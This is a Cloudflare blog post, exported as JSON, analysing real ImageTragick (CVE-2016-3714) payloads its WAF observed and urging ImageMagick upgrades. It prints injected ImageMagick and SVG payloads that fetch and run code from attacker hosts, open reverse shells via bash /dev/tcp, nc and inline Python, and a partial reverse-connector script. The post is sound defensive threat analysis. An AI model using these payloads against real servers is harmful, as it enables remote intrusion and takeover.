{
	"locale": "en-us",
	"post": {
		"access": true,
		"authors": [
			{
				"id": "5d1644b141acde0011a94f2c",
				"name": "John Graham-Cumming",
				"slug": "john-graham-cumming",
				"profile_image": "http://blog.cloudflare.com/content/images/2017/03/url-2.jpg",
				"cover_image": "http://blog.cloudflare.com/content/images/2023/05/Twitter-Header-@cloudflare-US.png",
				"bio": null,
				"website": null,
				"location": "Lisbon, Portugal",
				"facebook": null,
				"twitter": null,
				"meta_title": null,
				"meta_description": null,
				"url": "http://blog.cloudflare.com/author/john-graham-cumming/"
			}
		],
		"canonical_url": null,
		"codeinjection_foot": null,
		"codeinjection_head": null,
		"comment_id": "4804",
		"comments": false,
		"created_at": "2016-05-09T14:27:48.000+01:00",
		"custom_excerpt": "Last week multiple vulnerabilities were made public in the popular image manipulation software, ImageMagick. These were quickly named ImageTragick. ",
		"custom_template": null,
		"email_subject": null,
		"excerpt": "Last week multiple vulnerabilities were made public in the popular image manipulation software, ImageMagick. These were quickly named ImageTragick. ",
		"feature_image": "http://blog.cloudflare.com/content/images/2018/08/4968376506_9021f8ba78_z.jpg",
		"feature_image_alt": null,
		"feature_image_caption": null,
		"featured": false,
		"frontmatter": null,
		"html": "<!--kg-card-begin: markdown--><p>Last week multiple vulnerabilities were made public in the popular image manipulation software, <a href=\"https://www.imagemagick.org/script/index.php\">ImageMagick</a>. These were quickly named <a href=\"https://imagetragick.com/\">ImageTragick</a>. Although a vulnerability in image manipulation software might not seem like a problem for web site owners it is in fact a genuine security concern.</p>\n<p>CloudFlare quickly rolled out a <a href=\"https://www.cloudflare.com/waf/\">WAF</a> rule to protect our customers from this vulnerability. It was automatically deployed for all customers with the WAF enabled. We know that it takes time for customers to upgrade their web server software and so the WAF protects them in the interim.</p>\n<p><img src=\"http://blog.cloudflare.com/content/images/2016/05/logo-medium.png\" alt=\"\" loading=\"lazy\"></p>\n<p>Many websites allow users to upload images and the websites themselves often manipulate these images using software like ImageMagick. For example, if you upload a picture of yourself to use as an avatar, it will very likely be resized by the website. ImageMagick is very popular and there are plugins that make it easy to use with PHP, Ruby, Node.js and other languages so it is common for websites to use it for image resizing or cropping.</p>\n<p>Unfortunately, researchers discovered that it was possible to execute arbitrary code (<a href=\"https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-3714\">CVE-2016-3714</a>) by hiding it inside image files that a user uploads. That means an attacker can make a web server do its bidding by uploading an image containing code the attacker chooses.</p>\n<p>As ever, it is critical that users of ImageMagick <a href=\"https://www.imagemagick.org/script/changelog.php\">upgrade</a> as quickly as possible to be fully protected.</p>\n<h3 id=\"shellshock2\">Shellshock 2?</h3>\n<p>Back in 2014 I wrote about another nasty code execution vulnerability called <a href=\"http://blog.cloudflare.com/inside-shellshock/\">Shellshock</a>. In that blog post I wrote:</p>\n<p><em>The Shellshock problem is an example of an <a href=\"https://en.wikipedia.org/wiki/Arbitrary_code_execution\">arbitrary code execution</a> (ACE) vulnerability. Typically, ACE vulnerability attacks are executed on programs that are running, and require a highly sophisticated understanding of the internals of code execution, memory layout, and assembly language—in short, this type of attack requires an expert.</em></p>\n<p><img src=\"http://blog.cloudflare.com/content/images/2016/05/illustration-bash-blog-1.png\" alt=\"\" loading=\"lazy\"></p>\n<p><em>Attacker will also use an ACE vulnerability to upload or run a program that gives them a simple way of controlling the targeted machine. This is often achieved by running a &quot;shell&quot;. A shell is a command-line where commands can be entered and executed.</em></p>\n<p><em>The Shellshock vulnerability is a major problem because it removes the need for specialized knowledge, and provides a simple (unfortunately, very simple) way of taking control of another computer (such as a web server) and making it run code.</em></p>\n<p>Sadly, the same is true of ImageTragick: attackers do not need to be sophisticated to take advantage of it and run arbitrary code on a vulnerable web server. Shellshock was especially nasty because of how widespread the vulnerability was; ImageTragick is less widespread but a real problem for sites that use it to manipulate images that users upload.</p>\n<h3 id=\"reconnaissance\">Reconnaissance</h3>\n<p>We began watching the exploitation of CVE-2016-3714 as soon as the WAF rule went live across our network. The bad news is that this vulnerability is being actively used by hackers to attack websites.</p>\n<p>I’ve gathered examples of the most popular payloads being used by hackers. These are not weaponized as I have removed the image wrapping from around the payloads to ensure that they cannot simply be copied and pasted to perform an attack. I have also obscured IP addresses and website names used by attackers.</p>\n<p><img src=\"http://blog.cloudflare.com/content/images/2016/05/4968376506_9021f8ba78_z.jpg\" alt=\"\" loading=\"lazy\"><br>\n<small><a href=\"https://creativecommons.org/licenses/by/2.0/\">CC BY 2.0</a> <a href=\"https://www.flickr.com/photos/jason_ff/4968376506/in/photolist-nppKpF-9maSMt-6UjRg3-8dZ2v1-9maSMF-ciWDeQ-8wyQBR-8wyMtg-bHAn9H-8wBWpd-Br4Jmk-8wUBkj-8wRBy2-8wyMna-Hkuoq-2GfCf3-7Fb2i-9sBsEq-ojiew6-8NRizs-aadh3q-aadhhj-8z3eeU-qobKXg-CosgiZ-CdT34E-8wBPi9-8wyWPR-66mmrK-2VkSj5-fwm2w-2EJZZ1-azHtta\">image</a> by <a href=\"https://www.flickr.com/photos/jason_ff/\">Jason Brennan</a></small></p>\n<p>The most common payload contains the following snippet:</p>\n<pre><code>fill 'url(https://pre09.example.net/15bd/th/pre/f/2012/237/c/7/all_work_and_no_something\nsometing_by_nebezial-d5cdlor.jpg&quot;;curl &quot;example.com)'\n</code></pre>\n<p>This particular payload should not cause any damage as the curl command just returns the text of a 301 Moved Permanently HTTP error. The attacker may have been using this as a way of testing whether the exploit worked on a specific website. Once they know that something works they can come back and try to break into the server using a more complex payload.</p>\n<p>The next payload looks like it might similarly be used for reconnaissance:</p>\n<pre><code>&lt;image xlink:href=&quot;https://127.0.0.1/image.jpg&quot;|wget xx.xx.116.214/loltest;&quot; \nx=&quot;0&quot; y=&quot;0&quot; height=&quot;140px&quot; width=&quot;140px&quot;/&gt;\n</code></pre>\n<p>The wget command results in a 404 Not Found error (although there might have been a real file downloaded at some point). Even with a 404 error an attacker can look through their own server logs (of the server at xx.xx.116.214) to discover the IP address of any website on which the payload worked. They can then return to the website later to attack it properly.</p>\n<h3 id=\"remoteaccess\">Remote Access</h3>\n<p>Another style of payload looks like this:</p>\n<pre><code>fill 'url(https://127.0.0.0/sdfsdf.jpg&quot;|wget -o- a0074942.example.com/dfgdfg &gt;\n&quot;/tmp/dfgfdgfdg)'\n</code></pre>\n<p>The attacker downloads a file (presumably from a server they control) using wget and saves it to a file on the website’s server. This could be the prelude to a larger attack and the contents of the temporary file would likely contain a program to be executed on the web server giving the attacker access.</p>\n<p><img src=\"http://blog.cloudflare.com/content/images/2016/05/52823834_5429a6e452_z.jpg\" alt=\"\" loading=\"lazy\"><br>\n<small><a href=\"https://creativecommons.org/licenses/by-sa/2.0/\">CC BY-SA 2.0</a> <a href=\"https://www.flickr.com/photos/eklektikos/52823834/in/photolist-5EJFL-nCKUnd-5G4WGv-8iogvR-e8Smqc-9eXH23-oXmq66-ChqSEh-8Enzct-Byd9kC-apKYx5-6VZ7U7-8KibTc-8poYHx-63hmpb-gZ7WnC-66xzCZ-nxAbfy-5S7sx2-3FshC-dxEaU-7pPAjY-bJHYtV-oH5R5e-9jTMKP-ac28HM-oJ44cc-4aZN82-JciZ3-Nvcgu-4L34v1-9EMzzd-9mTWFx-9mWYV9-fMQmU2-5GZon4-aJDuEp-4jDMhn-k7N6qc-8P9AZr-hG7WGu-335tK9-9VGNyf-5ppck5-7KgP26-6uqKfV-5tYMxX-9fKY8H-aJDuFk-9fKYgZ\">image</a> by <a href=\"https://www.flickr.com/photos/eklektikos/52823834/in/photolist-5EJFL-nCKUnd-5G4WGv-8iogvR-e8Smqc-9eXH23-oXmq66-ChqSEh-8Enzct-Byd9kC-apKYx5-6VZ7U7-8KibTc-8poYHx-63hmpb-gZ7WnC-66xzCZ-nxAbfy-5S7sx2-3FshC-dxEaU-7pPAjY-bJHYtV-oH5R5e-9jTMKP-ac28HM-oJ44cc-4aZN82-JciZ3-Nvcgu-4L34v1-9EMzzd-9mTWFx-9mWYV9-fMQmU2-5GZon4-aJDuEp-4jDMhn-k7N6qc-8P9AZr-hG7WGu-335tK9-9VGNyf-5ppck5-7KgP26-6uqKfV-5tYMxX-9fKY8H-aJDuFk-9fKYgZ\">Todd Ehlers</a></small></p>\n<p>A much more dangerous payload was very popular with attackers over the weekend:</p>\n<pre><code>fill 'url(https://example.com/image.jpg&quot;|wget http://example.com/x.py \n-o /tmp/x.py &amp;&amp; python /tmp/x.py xx.xx.15.179 80&quot;)'\n</code></pre>\n<p>This downloads a python program called <code>x.py</code> from a server the attack controls, saves it as <code>/tmp/x.py</code> and then executes it. The parameters to the program are the IP address and port of a machine to contact. The python code connects to that machine and makes a shell available on the web server to the attacker. At that point the attacker can interact directly with the web server.</p>\n<p>Here’s a snippet of the downloaded program:</p>\n<pre><code># -*- coding:utf-8 -*-\n#!/usr/bin/env python\n&quot;&quot;&quot;\nback connect py version,only linux have pty module\ncode by google security team\n&quot;&quot;&quot;\n\nimport sys,os,socket\nshell = &quot;/bin/sh&quot;\n\ndef usage(name):\n    print 'python reverse connector'\n    print 'usage: %s &lt;ip_addr&gt; &lt;port&gt;' % name\n\n\ndef main():    \nif len(sys.argv) !=3:  \n     usage(sys.argv[0])   \n     sys.exit()\n\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    try:\n        s.connect((sys.argv[1],int(sys.argv[2])))\n        print 'connect ok'\n    except:\n        print 'connect faild'\n        sys.exit()\n\n[...]\n\n    pty.spawn(shell)\n    s.close()\n\nif __name__ == '__main__':\n    main()\n</code></pre>\n<p>A variant of this payload eliminates the need to download the python program and includes it in the payload itself:</p>\n<pre><code>fill 'url(https://example.com/image.jpg&quot;|/bin/echo -e \\'import \nsocket\\x2csubprocess\\x2cos;s=socket.socket(socket.af_inet\\x2csocket.sock_stream);\ns.connect((&quot;xx.xx.24.85&quot;\\x2c443));p=subprocess.call(\\x5b&quot;/bin/sh&quot;\\x2c&quot;-i&quot;\\x5d);\\'\n&gt; /dev/shm/a.py|python &quot;/dev/shm/a.py)'\n</code></pre>\n<p>Getting access to the server via a shell or other connection proved popular with attackers who used payloads like this:</p>\n<pre><code>fill 'url(https://\\x22|setsid /bin/bash -i &gt;/dev/tcp/xx.xx.248.51/443\n0&lt;&amp;1 2&gt;&amp;1&quot;)'\n\nfill 'url(https://profile-photos.example.com/production/000/003/658/b4eb8_\nxtralarge.png&quot;|nc -e /bin/sh xx.xx.151.208\n</code></pre>\n<p>The first uses <a href=\"http://linux.die.net/man/1/setsid\">setsid</a> to create a new session and then hooks up the bash shell to a TCP connection back to the hacker’s server. The second uses <a href=\"http://linux.die.net/man/1/nc\">nc</a> to attempt the same thing.</p>\n<p>All these payloads are designed to give the hacker unfettered access to the vulnerable web server. With a single exploit they can get remote access and then proceed to further hack the vulnerable web server at their leisure.</p>\n<h3 id=\"conclusion\">Conclusion</h3>\n<p>CloudFlare continually updates our WAF as vulnerabilities are found and customers get automatic protection. Nevertheless, we urge all users of ImageMagick to upgrade as quickly as possible.</p>\n<p>At the current time we do not know of a website that has been successfully hacked using ImageTragick, but it is clear that hackers are actively trying this vulnerability as it is fresh and many servers are likely to not have been patched yet.</p>\n<p>If you are interested in understanding the vulnerability in more detail, the researchers have a set of non-weaponized <a href=\"https://github.com/ImageTragick/PoCs\">PoCs</a> available and a program for testing whether an installed version of ImageMagick on your own server is vulnerable. They also have a <a href=\"https://imagetragick.com/#info\">detailed description</a> of the underlying problem.</p>\n<p>PS CloudFlare is <a href=\"https://www.cloudflare.com/join-our-team/\">hiring</a> in London, San Francisco, Austin, Singapore and Champaign, IL.</p>\n<!--kg-card-end: markdown-->",
		"id": "5d16453b41acde0011a9559d",
		"meta_description": null,
		"meta_title": null,
		"og_description": null,
		"og_image": null,
		"og_title": null,
		"primary_author": {
			"id": "5d1644b141acde0011a94f2c",
			"name": "John Graham-Cumming",
			"slug": "john-graham-cumming",
			"profile_image": "http://blog.cloudflare.com/content/images/2017/03/url-2.jpg",
			"cover_image": "http://blog.cloudflare.com/content/images/2023/05/Twitter-Header-@cloudflare-US.png",
			"bio": null,
			"website": null,
			"location": "Lisbon, Portugal",
			"facebook": null,
			"twitter": null,
			"meta_title": null,
			"meta_description": null,
			"url": "http://blog.cloudflare.com/author/john-graham-cumming/"
		},
		"primary_tag": {
			"id": "5d16450341acde0011a951a5",
			"name": "WAF Rules",
			"slug": "waf-rules",
			"description": null,
			"feature_image": null,
			"visibility": "public",
			"meta_title": null,
			"meta_description": "WAF Rules (EN)",
			"og_image": null,
			"og_title": null,
			"og_description": null,
			"twitter_image": null,
			"twitter_title": null,
			"twitter_description": null,
			"codeinjection_head": null,
			"codeinjection_foot": null,
			"canonical_url": null,
			"accent_color": null,
			"url": "http://blog.cloudflare.com/tag/waf-rules/"
		},
		"published_at": "2016-05-09T14:34:26.000+01:00",
		"reading_time": 6,
		"slug": "inside-imagetragick-the-real-payloads-being-used-to-hack-websites-2",
		"tags": [
			{
				"id": "5d16450341acde0011a951a5",
				"name": "WAF Rules",
				"slug": "waf-rules",
				"description": null,
				"feature_image": null,
				"visibility": "public",
				"meta_title": null,
				"meta_description": "WAF Rules (EN)",
				"og_image": null,
				"og_title": null,
				"og_description": null,
				"twitter_image": null,
				"twitter_title": null,
				"twitter_description": null,
				"codeinjection_head": null,
				"codeinjection_foot": null,
				"canonical_url": null,
				"accent_color": null,
				"url": "http://blog.cloudflare.com/tag/waf-rules/"
			},
			{
				"id": "5d16450341acde0011a951e6",
				"name": "WAF",
				"slug": "waf",
				"description": null,
				"feature_image": null,
				"visibility": "public",
				"meta_title": null,
				"meta_description": null,
				"og_image": null,
				"og_title": null,
				"og_description": null,
				"twitter_image": null,
				"twitter_title": null,
				"twitter_description": null,
				"codeinjection_head": null,
				"codeinjection_foot": null,
				"canonical_url": null,
				"accent_color": null,
				"url": "http://blog.cloudflare.com/tag/waf/"
			},
			{
				"id": "5d16450341acde0011a951aa",
				"name": "Vulnerabilities",
				"slug": "vulnerabilities",
				"description": "Vulnerabilities (EN)",
				"feature_image": null,
				"visibility": "public",
				"meta_title": null,
				"meta_description": null,
				"og_image": null,
				"og_title": null,
				"og_description": null,
				"twitter_image": null,
				"twitter_title": null,
				"twitter_description": null,
				"codeinjection_head": null,
				"codeinjection_foot": null,
				"canonical_url": null,
				"accent_color": null,
				"url": "http://blog.cloudflare.com/tag/vulnerabilities/"
			},
			{
				"id": "5d16450341acde0011a951ce",
				"name": "Reliability",
				"slug": "reliability",
				"description": null,
				"feature_image": null,
				"visibility": "public",
				"meta_title": null,
				"meta_description": null,
				"og_image": null,
				"og_title": null,
				"og_description": null,
				"twitter_image": null,
				"twitter_title": null,
				"twitter_description": null,
				"codeinjection_head": null,
				"codeinjection_foot": null,
				"canonical_url": null,
				"accent_color": null,
				"url": "http://blog.cloudflare.com/tag/reliability/"
			},
			{
				"id": "5d16450341acde0011a95265",
				"name": "Security",
				"slug": "security",
				"description": null,
				"feature_image": "http://blog.cloudflare.com/content/images/2020/10/Security.png",
				"visibility": "public",
				"meta_title": "Cloudflare Blog: Security",
				"meta_description": "Collection of Cloudflare blog posts tagged 'Security'.",
				"og_image": null,
				"og_title": null,
				"og_description": null,
				"twitter_image": null,
				"twitter_title": null,
				"twitter_description": null,
				"codeinjection_head": null,
				"codeinjection_foot": null,
				"canonical_url": null,
				"accent_color": null,
				"url": "http://blog.cloudflare.com/tag/security/"
			}
		],
		"title": "Inside ImageTragick: The Real Payloads Being Used to Hack Websites",
		"twitter_description": null,
		"twitter_image": null,
		"twitter_title": null,
		"updated_at": "2018-08-27T21:27:03.000+01:00",
		"url": "http://blog.cloudflare.com/inside-imagetragick-the-real-payloads-being-used-to-hack-websites-2/",
		"uuid": "0039d337-1a62-4c45-adc7-beaaedb9ceec",
		"visibility": "public"
	}
}